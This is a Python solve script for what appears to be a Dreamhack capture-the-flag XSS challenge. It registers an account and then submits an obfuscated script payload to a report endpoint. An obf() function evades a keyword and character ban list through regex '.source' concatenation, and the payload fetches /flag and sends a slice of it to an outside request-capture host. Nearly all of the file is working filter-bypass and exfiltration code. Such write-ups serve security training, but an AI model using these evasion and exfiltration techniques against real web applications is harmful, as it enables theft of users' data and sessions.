import requests
from urllib.parse import quote

url = "http://host3.dreamhack.games:17656/"
s = requests.Session()

# login
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/register', data={
    **creds,
    'confirm': creds['password']
})

res = s.post(f'{url}/login', data=creds)

print("> Logged in")

# xss
banlist = [
    "`", "\"", "'", ";", "@", "!", "%", "(", ")", "!", "\\x", "alert", "fetch", "replace",
    "javascript", "location", "href", "window", "innerHTML", "src", "document", "cookie",
    "function", "constructor", "atob", "decodeURI", "decodeURIComponent", "escape", "unescape",
    "setTimeout", "xhr", "XMLHttpRequest", "origin", "this", "self", "proto", "prototype"
]

def obf(payload):
    # constants
    consts = [
        'e=eval+1',
        r's=/\//.source[1]',    # forward slash
        'l=e[13]',              # left brace
        'r=e[14]'               # right brace
    ]

    # replace slashes
    payload = payload.split('/')
    payload = '/.source+s+/'.join(payload)

    # replace left braces
    payload = payload.split('(')
    payload = '/.source+l+/'.join(payload)
    
    # replace right braces
    payload = payload.split(')')
    payload = '/.source+r+/'.join(payload)

    payload = f'{','.join(consts)},top[/location/.source]=/javascript:{payload}/.source'

    # replace blacklist
    for ban in banlist:
        if ban in payload:
            mid = len(ban) // 2
            l, r = ban[:mid], ban[mid:]

            payload = payload.replace(ban, f'{l}/.source+/{r}')

    # scuffed asl
    payload = payload.replace("+//.source", '')

    return payload

webhook = "ewdtmyp.request.dreamhack.games"
payload = "async function f(){r=await fetch(/flag/.source),d=await r.text(),location.href=s+s+/%s?exfil=/.source+d.slice(1128,1180)}f()" % webhook
payload = obf(payload)

res = s.get(f'{url}/report', params={
    'payload': f'<script>{quote(payload)}</script>'
})

if "success" in res.text.lower():
    print("> Payload submitted")